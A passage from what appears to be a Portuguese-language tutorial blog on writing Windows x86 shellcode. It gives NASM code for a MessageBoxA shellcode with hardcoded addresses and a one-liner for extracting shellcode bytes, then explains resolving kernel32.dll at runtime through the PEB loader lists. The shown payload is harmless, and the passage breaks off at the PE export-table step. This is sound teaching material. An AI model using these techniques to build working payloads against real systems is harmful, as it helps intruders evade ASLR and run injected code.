	<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">;envia NULL para o topo da pilha definindo o windowhandle</span>

	<span class="nf">call</span> <span class="nb">eax</span>            <span class="c1">;chama o endereço da função MessageBoxA</span>
</pre></table></code></div></div><p>Este trecho de código monta e chama a função <code class="language-plaintext highlighter-rouge">MessageBoxA()</code>. Esta função tem o seguinte formato:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">MessageBoxA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">HWND</span>   <span class="n">hWnd</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPCSTR</span> <span class="n">lpText</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPCSTR</span> <span class="n">lpCaption</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">UINT</span>   <span class="n">uType</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Por fim, incluímos a função <code class="language-plaintext highlighter-rouge">ExitProcess()</code> para finalizar o processo normalmente.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nl">end:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	<span class="nf">push</span> <span class="nb">eax</span>
	<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x772a7460</span> <span class="c1">;endereço da função ExitProcess</span>
	<span class="nf">call</span> <span class="nb">eax</span>
</pre></table></code></div></div><p>Juntando todas as partes, temos o seguinte programa:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.data</span>

<span class="nf">section</span> <span class="nv">.bss</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>

	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">;eax conterá os endereços de retorno</span>
	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>    <span class="c1">;ebx conterá os endereços das funções</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>    <span class="c1">;ecx conterá os ponteiros para as strings</span>
	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;edx conterá um valor NULL</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Library</span>

<span class="nl">ReturnLibrary:</span>

	<span class="nf">pop</span> <span class="nb">ecx</span>                <span class="c1">;captura o ponteiro para a string "user32.dllA"</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="mi">10</span><span class="p">],</span> <span class="nb">dl</span>     <span class="c1">;subsitui o "A" por NULL</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x772b0ed0</span>    <span class="c1">;endereço da LoadLibraryA</span>
	<span class="nf">push</span> <span class="nb">ecx</span>               <span class="c1">;envia a string para o topo da stack</span>
	<span class="nf">call</span> <span class="nb">ebx</span>               <span class="c1">;com a chamada, eax conterá o identificador do módulo user32.dll</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Function</span>

<span class="nl">ReturnFunction:</span>

	<span class="nf">pop</span> <span class="nb">ecx</span>                <span class="c1">;captura o ponteiro para a string</span>
	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">dl</span>     <span class="c1">;subsitui o "A" por NULL</span>
	<span class="nf">push</span> <span class="nb">ecx</span>               <span class="c1">;envia a string para o topo da stack na posição 2</span>
	<span class="nf">push</span> <span class="nb">eax</span>               <span class="c1">;envia o identificador do módulo user32.dll para o topo da pilha na posição 1</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x77298250</span>    <span class="c1">;endereço da GetProcAddress</span>
	<span class="nf">call</span> <span class="nb">ebx</span>               <span class="c1">;com a chamada, eax conterá o endereço da função MessageBoxA</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Message</span>

<span class="nl">ReturnMessage:</span>

	<span class="nf">pop</span> <span class="nb">ecx</span>             <span class="c1">;captura o ponteiro para a string</span>
	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="mi">17</span><span class="p">],</span> <span class="nb">dl</span>  <span class="c1">;subsitui o "A" por NULL</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>

	<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">;envia NULL para o topo da pilha definindo o tipo da box MB_OK</span>
	<span class="nf">push</span> <span class="nb">ecx</span>            <span class="c1">;envia a string para o topo da pilha definindo o title</span>
	<span class="nf">push</span> <span class="nb">ecx</span>            <span class="c1">;envia a string para o topo da pilha definindo a mensagem</span>
	<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">;envia NULL para o topo da pilha definindo o windowhandle</span>

	<span class="nf">call</span> <span class="nb">eax</span>            <span class="c1">;chama o endereço da função MessageBoxA</span>

<span class="nl">end:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	<span class="nf">push</span> <span class="nb">eax</span>
	<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x772a7460</span> <span class="c1">;endereço da função ExitProcess</span>
	<span class="nf">call</span> <span class="nb">eax</span>

<span class="nl">Library:</span>
	<span class="nf">call</span> <span class="nv">ReturnLibrary</span>
	<span class="kd">db</span> <span class="s">'user32.dllA'</span>

<span class="nl">Function:</span>

	<span class="nf">call</span> <span class="nv">ReturnFunction</span>
	<span class="kd">db</span> <span class="s">'MessageBoxAA'</span>

<span class="nl">Message:</span>

	<span class="nf">call</span> <span class="nv">ReturnMessage</span>
	<span class="kd">db</span> <span class="err">'</span><span class="nv">Hack</span> <span class="nv">The</span> <span class="nv">Plannet</span><span class="err">!</span><span class="nv">A</span><span class="err">'</span>
</pre></table></code></div></div><p>Agora podemos compilar, linkar e verificar os bytes:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf message.asm
<span class="nv">$ </span>ld <span class="nt">-m</span> elf_i386 <span class="nt">-o</span> message message.o
<span class="nv">$ </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> message
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716200930.png" alt="" /></p><p>Utilizando o mesmo <em>oneliner</em> de antes, obtemos a <em>string</em> com o <em>shellcode</em>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> message | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716201127.png" alt="" /></p><p>Seguindo os exemplos anteriores, podemos injetar este <em>shellcode</em> no programa de testes, compilá-lo da mesma forma e executar no Windows.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716201412.png" alt="" /></p><p>Por mais simples que seja a ação deste <em>shellcode</em>, o fato de ter introduzido o endereçamento dinâmico, é importante para o entendimento de processos mais complexos que envolvem a exploração de ambientes desconhecidos,</p><hr /><h2 id="shellcode-com-endereços-dinâmicos">Shellcode com Endereços Dinâmicos</h2><p>Os <em>shellcodes</em> com endereços codificados são muito úteis para abrir as portas do entendimento de <em>shellcode</em> em ambiente Windows, porém, na maioria das vezes, não se aplicam no cenário real por alguns motivos: os endereços de memória das bibliotecas e funções variam de versão para versão do Windows, de atualização para atualização, e de <em>patch</em> para <em>patch</em>, além de que, toda vez que o sistema é reiniciado, os endereços mudam graças ao ASLR (<em>Address Space Layout Randomization</em>). Ou seja, para que este método funcione, é preciso já ter acesso à máquina alvo para os endereços serem extraídos antes da criação do <em>shellcode</em>, o que é extremamente raro de acontecer.</p><p>Para que um <em>shellcode</em> possa se aplicar de forma mais “automática” possível, ele deve ser capaz de, por si só, encontrar os endereços de memória que precisa em tempo de execução.</p><p>Esse processo é menos complexo do que parece, porém, bastante trabalhoso e exige um certo nível de entendimento sobre o SO. No intuito de gerar ou direcionar para o conhecimento necessário, exploraremos conceitualmente cada parte.</p><h3 id="entendendo-as-chamadas-de-baixo-nível">Entendendo as Chamadas de Baixo Nível</h3><p>Quando criamos um programa em <code class="language-plaintext highlighter-rouge">C</code> e utilizamos a biblioteca Windows.h (<code class="language-plaintext highlighter-rouge">#include &lt;Windows.h&gt;</code>) ela automaticamente fará um link dinâmico com todas as dependências necessários para execução deste no ambiente Windows. Porém, isso não acontece quando criamos um programa em ASM, neste caso é preciso descobrir o endereço das funções desejadas, carregar os argumentos na <em>stack</em> e chamar o registrador que tem o ponteiro para o endereço da função.</p><p>Um fato importante para saber, é que a maioria das funções do Windows, são acessadas através das <code class="language-plaintext highlighter-rouge">DLL Primárias</code>: <strong>ntdll.dll</strong>, <strong>kernel32.dll</strong> e <strong>kernelbase.dll</strong>. Estas são DLL de extrema importância para o funcionamento do kernel, portanto, toda vez que executamos um binário, elas são automaticamente carregadas.</p><p>Para exemplificar, podemos utilizar um simples programa em <code class="language-plaintext highlighter-rouge">C</code> que chama a calculadora:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">UINT</span> <span class="n">result</span><span class="p">;</span>

    <span class="n">result</span> <span class="o">=</span> <span class="n">WinExec</span><span class="p">(</span><span class="s">"calc.exe"</span><span class="p">,</span> <span class="n">SW_SHOW</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717101649.png" alt="" /></p><p>Vamos carregar este programa no <em>debugger</em> <code class="language-plaintext highlighter-rouge">x32dbg</code> e “debugar” seu comportamento.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717102017.png" alt="" /></p><p>Ao visualizarmos o Log, podemos ver que as DLL primárias foram carregadas com o programa. Se navegarmos pelos “<em>Symbols</em>” podemos ver todas as bibliotecas carregadas.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717102551.png" alt="" /></p><p>Se procurarmos pela função <code class="language-plaintext highlighter-rouge">WinExec</code> utilizada no programa, veremos que ela é carregada pela biblioteca <code class="language-plaintext highlighter-rouge">kernel32.dll</code> com o endereço <code class="language-plaintext highlighter-rouge">0x76705140</code>. Podemos confirmar pesquisando pela função em nosso programa <code class="language-plaintext highlighter-rouge">getaddr.exe</code>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717102745.png" alt="" /></p><p>Portanto, a informação do <em>debugger</em> x32dbg confere com o endereço real da função em tempo de execução.</p><p>Uma vez que sabemos que as DLL primárias são carregadas toda vez que um binário é executado, é possível calcular seu endereço de memória e, consequentemente, calcular o endereço da função desejada. O que temos que saber inicialmente é em qual ordem estas bibliotecas são carregadas. Felizmente a ordem pode mudar de versão para versão, mas será sempre a mesma para uma única versão, isso significa que a ordem de carregamento pode mudar entre o Windows 10 e 11, mas será sempre a mesma no Windows 11, independente da atualização ou <em>patch</em>.</p><p>Com isso, temos os seguintes passos:</p><ol><li>Descobrir a ordem de carregamento da kernel32.dll;<li>Encontrar o endereço da kernel32.dll;<li>Encontrar o endereço da função desejada;<li>Carregar os argumentos da função na <em>stack</em>;<li>Chamar o ponteiro com o endereço da função.</ol><h3 id="descendo-um-pouco-mais">Descendo Um Pouco Mais</h3><p>Para conseguirmos o endereço da biblioteca kernel32.dll em tempo de execução, precisamos descer um pouco mais o nível e entender como o kernel processa toda a informação quando executamos um programa.</p><p>Toda vez que um <code class="language-plaintext highlighter-rouge">.exe</code> é executado, as primeiras coisas a serem criadas são o <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb">TEB (Thread Environment Block)</a> e o <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB (Process Environment Block)</a>.</p><p>De forma simplificada, o SO aloca uma estrutura para cada processo em execução, a primeira estrutura é a TEB, acessível a partir do registro FS (<em>File Segment</em>), dentro da TEB existe um ponteiro para a PEB. A estrutura PEB, conhecida como LDR, contém a estrutura <code class="language-plaintext highlighter-rouge">PEB_LDR_DATA</code> que mantém informações sobre <em>heaps</em>, sobre o binário, e o mais importante neste cenário: 3 listas vinculadas sobre módulos carregados mapeados no espaço do processo, sendo elas:</p><ul><li><strong>InLoadOrderModuleList</strong> - A ordem na qual os módulos (exes ou dlls) são carregados;<li><strong>InMemoryOrderModuleList</strong> - A ordem na qual os módulos (exes ou dlls) são armazenados na memória;<li><strong>InInitializationOrderModuleList</strong> - A ordem na qual os módulos (exes ou dlls) são inicializados na PEB.</ul><p>Para termos uma visão mais simples dos endereçamentos, podemos abir o programa com o “debugger” <code class="language-plaintext highlighter-rouge">windbg</code>. Ao iniciar o programa no debugger, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">!peb</code> para visualizar a estrutura iniciada.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717141432.png" alt="" /></p><p>Conforme visto, o endereço da LDR é <code class="language-plaintext highlighter-rouge">0x7767eb20</code>. Esta informação é de extrema importância, uma vez que vamos utilizá-la para calcular os próximos endereços.</p><p>Agora podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dt nt!_TEB</code> para encontrar o <em>offset</em> da estrutura PEB.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717141738.png" alt="" /></p><p>Conforme a imagem, o <em>offset</em> da estrutura <code class="language-plaintext highlighter-rouge">_PEB</code> é de <code class="language-plaintext highlighter-rouge">0x030</code>. Também podemos ver o conteúdo da estrutura com o mesmo comando <code class="language-plaintext highlighter-rouge">dt nt!_PEB</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717142038.png" alt="" /></p><p>O <em>offset</em> para <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code> é <code class="language-plaintext highlighter-rouge">0x00c</code>. Também podemos utilizar o mesmo comando <code class="language-plaintext highlighter-rouge">dt nt!_PEB_LDR_DATA</code> para verificar o que existe na estrutura <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717142457.png" alt="" /></p><p>As 3 listas vinculadas estão dentro da <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code> conforme esperado. InLoadOrderModuleList com <em>offset</em> de <code class="language-plaintext highlighter-rouge">0x00c</code>, InMemoryOrderModuleList com <em>offset</em> de <code class="language-plaintext highlighter-rouge">0x014</code> e InInitializationOrderModuleList com <em>offset</em> de <code class="language-plaintext highlighter-rouge">0x01c</code>. Para vermos o exato endereço onde estas listas são carregadas, podemos utilizar o endereço da LDR (<code class="language-plaintext highlighter-rouge">0x7767eb20</code>) que encontramos anteriormente, com o comando <code class="language-plaintext highlighter-rouge">dt nt!_PEB_LDR_DATA 7767eb20</code>. Isto nos mostrará os endereços de início e fim de cada lista.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717150956.png" alt="" /></p><p>Agora temos um “pulo do gato”. O windbg classificou a lista <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code> no endereço <code class="language-plaintext highlighter-rouge">0x1214208</code> como uma <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code>, porém, ao consultar o <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">MSDN</a>, a própria Microsoft a classifica como uma <code class="language-plaintext highlighter-rouge">LDR_DATA_TABLE_ENTRY</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717151603.png" alt="" /></p><p>Desta forma, podemos visualizar os módulos carregados nessa estrutura especificando seu endereço de início. Lembrando que <code class="language-plaintext highlighter-rouge">0x1214208</code> é o endereço da própria <code class="language-plaintext highlighter-rouge">struct</code>, então sua primeira entrada se encontra 8 <em>bytes</em> abaixo, logo o comando é <code class="language-plaintext highlighter-rouge">dt nt!_LDR_DATA_TABLE_ENTRY 0x1214208-8</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717153742.png" alt="" /></p><p>Observando a saída do comando, podemos concluir que a primeira <code class="language-plaintext highlighter-rouge">BaseDllName</code> é “callcalc.exe”, ou seja, o próprio executável que estamos analisando. Também podemos observar que o endereço da <code class="language-plaintext highlighter-rouge">InMemoryOrderLinks</code> agora é <code class="language-plaintext highlighter-rouge">0x12140f0</code> e a <code class="language-plaintext highlighter-rouge">DllBase</code> no <em>offset</em> <code class="language-plaintext highlighter-rouge">0x018</code> contém do endereço base da <code class="language-plaintext highlighter-rouge">BaseDllName</code>. O próximo módulo agora se encontra 8 <em>bytes</em> antes de <code class="language-plaintext highlighter-rouge">0x12140f0</code>, ou seja, <code class="language-plaintext highlighter-rouge">dt nt!_LDR_DATA_TABLE_ENTRY 0x12140f0-8</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717154638.png" alt="" /></p><p>O Segundo módulo carregado foi <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, seu endereço é <code class="language-plaintext highlighter-rouge">0x77550000</code> e o próximo módulo está 8 <em>bytes</em> antes de <code class="language-plaintext highlighter-rouge">0x12146b0</code>, ou seja, <code class="language-plaintext highlighter-rouge">dt nt!_LDR_DATA_TABLE_ENTRY 0x12146b0-8</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717155118.png" alt="" /></p><p>O terceiro módulo carregado, é justamente a <code class="language-plaintext highlighter-rouge">kernel32.dll</code> que precisamos. Esta ordem de carregamento será sempre a mesma em cada versão do SO, no caso dos testes para este artigo, foi utilizado um Windows 11, ou seja, todas as atualizações do Windows 11 terão a mesma ordem de carregamento. Da mesma forma que fizemos, também podemos consultar o quarto módulo, a <code class="language-plaintext highlighter-rouge">kernelbase.dll</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717155442.png" alt="" /></p><p>Isso significa que podemos caminhar por toda a estrutura PEB LDR durante a execução para encontrar o endereço da kernel32.dll.</p><p>Resumindo o que este processo nos forneceu de informação:</p><ol><li>A PEB está localizada em um <em>offset</em> de <code class="language-plaintext highlighter-rouge">0x030</code> do registrador FS;<li>A LDR está localizada em um <em>offset</em> de <code class="language-plaintext highlighter-rouge">PEB + 0x00c</code>;<li>InMemoryOrderModuleList está localizada em um <em>offset</em> de <code class="language-plaintext highlighter-rouge">LDR + 0x014</code>;<li>O primeiro módulo carregado é o próprio .exe;<li>O segundo módulo carregado é a ntdll.dll;<li>O terceiro módulo carregado é a kernel32.dll;<li>O quarto módulo carregado é a kernelbase.dll.</ol><p>Toda vez que uma DLL é carregada o endereço é armazenado no <em>offset</em> da <code class="language-plaintext highlighter-rouge">DllBase</code> que é <code class="language-plaintext highlighter-rouge">0x018</code>. O endereço de início das listas vinculadas é armazenado no <em>offset</em> da <code class="language-plaintext highlighter-rouge">InMemoryOrderLinks</code> que é <code class="language-plaintext highlighter-rouge">0x008</code>. Portanto a diferença de <em>offset</em> será <code class="language-plaintext highlighter-rouge">DllBase - InMemoryOrderLinks = 0x018 - 0x008 = 0x010</code>. Com isso, o <em>offset</em> da kernel32.dll é <code class="language-plaintext highlighter-rouge">LDR + 0x10</code>.</p><p>Convertendo este processo em ASM, temos o seguinte programa:</p><p><code class="language-plaintext highlighter-rouge">searchkernel32.asm</code>:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;zerando o registrador</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x30</span><span class="p">]</span>      <span class="c1">;movendo o offset da PEB de fs (File Segment) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>   <span class="c1">;movendo o offset da LDR (PEB + 0x00c) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>   <span class="c1">;movendo o offset da InMemoryOrderModuleList (LDR + 0x014) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do primeiro modulo - o executavel em si</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do segundo modulo - ntdll.dll</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>   <span class="c1">;carregando o endereço base do terceiro modulo - kernel32.dll</span>
</pre></table></code></div></div><p>Podemos compilar o programa no Windows:</p><pre><code class="language-cmd">&gt; nasm -f win32 searchkernel32.asm
&gt; ld -m i386pe searchkernel32.obj -o searchkernel32.exe
</code></pre><p>Ao executarmos o programa no debugger <code class="language-plaintext highlighter-rouge">xdbg32</code>, podemos ver que ao final, o endereço da kernel32.dll estará em <code class="language-plaintext highlighter-rouge">eax</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240717200049.png" alt="" /></p><h3 id="mergulhando-na-kernel32dll">Mergulhando na kernel32.dll</h3><p>Uma vez que já conseguimos descobrir o endereço da kernel32.dll em tempo de execução, o próximo passo é descobrir os endereços das funções que precisamos e estão contidas dentro dela também em tempo de execução.</p><p>Porém, como o ASLR randomiza os endereços de memória toda vez que o sistema operacional é iniciado, não existe uma forma de cravar um endereço específico em um <em>shellcode</em> e esperar que ele funcione em qualquer lugar.</p><p>Mas isso levanta a questão: se os endereços são randomizados a cada inicialização do SO para dificultar a exploração, como o próprio kernel consegue encontrar os endereços?</p><p>A solução dos SO para este problema são os já citados <em>offsets</em>, ou como o Windows chama RVAs (<em>Relative Virtual Address</em>). Os RVAs nada mais são que “tabelas” de referência para encontrar funções e objetos em espaços de memória.</p><p>Um exemplo hipotético e muito simplório seria: suponha que o RVA da função <code class="language-plaintext highlighter-rouge">WinExec()</code> seja <code class="language-plaintext highlighter-rouge">0x1c</code>, isso significa que se a biblioteca kernel32.dll for carregada no endereço <code class="language-plaintext highlighter-rouge">0x77ab0000</code> o endereço real da função <code class="language-plaintext highlighter-rouge">WinExec()</code> será a soma do endereço base com o <em>offset</em> da função, ou seja, <code class="language-plaintext highlighter-rouge">0x77ab001c</code>, se a kernel32.dll for carregada no endereço <code class="language-plaintext highlighter-rouge">0x75010000</code> a <code class="language-plaintext highlighter-rouge">WinExec()</code> será carregada no endereço <code class="language-plaintext highlighter-rouge">0x7501001c</code> e assim por diante.</p><p>Porém, no cenário real, esse processo não acontece com uma única “tabela”, os endereços relativos geralmente referenciam uma estrutura, que por sua vez tem outra estrutura referenciada, e esse caminho ocorre várias vezes até se chegar na função. Então o processo de análise precisa ser minucioso, com prática e repetição é muito simples, porém trabalhoso.</p><p>Para entender o conceito (que parece complexo), encontraremos o endereço da função <code class="language-plaintext highlighter-rouge">WinExec()</code> manualmente, depois sumarizar os passos para criar um programa que faz isso de forma automatizada.</p><p>Como este artigo não foi escrito em um único dia, a máquina foi reiniciada várias vezes, portanto utilizarei o programa getaddr.exe novamente para encontrar manualmente o endereço base da kernel32.dll.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718100137.png" alt="" /></p><p>Conforme o <em>output</em>, temos:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>kernel32.dll - 0x75700000
WinExec      - 0x75765140
</pre></table></code></div></div><p>Estas informações são importantes para conferirmos depois.</p><p>As <code class="language-plaintext highlighter-rouge">dll</code> assim como os <code class="language-plaintext highlighter-rouge">.exe</code> fazem parte da mesma família dos PE (<em>Portable Executable</em>), portanto, podemos analisar detalhadamente a kernel32.dll com o uso do <a href="http://wjradburn.com/software/">PEview</a>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718101528.png" alt="" /></p><p>No painel à esquerda temos as sessões da biblioteca, e no painel à direita temos seu conteúdo. Normalmente, executáveis contém muita informação, no início do arquivo temos a informação se é um arquivo DOS, um arquivo ELF, se é um MZ (<em>Magic number of executable</em>) ou qualquer outro formato. Ao analisar o arquivo, vemos que a kernel32.dll é um <strong>MZ</strong> na <strong>RVA 00000000</strong>. Porém, o que nos interessa no IMAGE_DOS_HEADER está no <strong>RVA 0000003c</strong> ou <code class="language-plaintext highlighter-rouge">0x3c</code> o <em>Offset to New EXE Header</em> que por sua vez contém um endereço de outra RVA <code class="language-plaintext highlighter-rouge">0xf8</code>.</p><p>Agora se navegarmos para <code class="language-plaintext highlighter-rouge">IMAGE_NT_HEADER-&gt;Signature</code> ele nos mostrará que no RVA F8 temos o <code class="language-plaintext highlighter-rouge">IMAGE_NT_SIGNATURE</code> e isso significa que é o ponto inicial do nosso cabeçalho PE.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718103740.png" alt="" /></p><p>O <code class="language-plaintext highlighter-rouge">IMAGE_NT_HEADERS</code> é basicamente uma estrutura Windows que contém 3 elementos: o <code class="language-plaintext highlighter-rouge">Signature</code> o <code class="language-plaintext highlighter-rouge">IMAGE_FILE_HEADER</code> e o <code class="language-plaintext highlighter-rouge">IMAGE_OPTIONAL_HEADER</code>. De acordo com <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32">MSDN</a> o <code class="language-plaintext highlighter-rouge">IMAGE_OPTIONAL_HEADER</code> é outra estrutura do Windows. Conforme visto na imagem abaixo, o último objeto desta estrutura, é o <code class="language-plaintext highlighter-rouge">IMAGE_DATA_DIRECTORY</code>, ela contém os RVAs e tamanhos de várias tabelas:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718104443.png" alt="" /></p><p>Basicamente, o cálculo dos endereços das tabelas segue a lógica de que: endereço da tabela = endereço da tabela anterior + tamanho da tabela anterior + 4 (tamanho do endereço 4 bytes), ou seja:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">RVA<th style="text-align: center">Tamanho da Tabela<th style="text-align: center">Nome da Tabela<tbody><tr><td style="text-align: center">10000<td style="text-align: center">1200<td style="text-align: center">A<tr><td style="text-align: center">11204 (10000 + 1200 + 4)<td style="text-align: center">1000<td style="text-align: center">B<tr><td style="text-align: center">13208 (11204 + 1000 + 4)<td style="text-align: center">1300<td style="text-align: center">C</table></div><p>Se olharmos para a primeira entrada da <code class="language-plaintext highlighter-rouge">IMAGE_DATA_DIRECTORY</code> veremos o RVA <code class="language-plaintext highlighter-rouge">170</code> correspondente a <code class="language-plaintext highlighter-rouge">EXPORT Table</code>, seu conteúdo é o <strong>RVA 93df0</strong>.</p><p><img 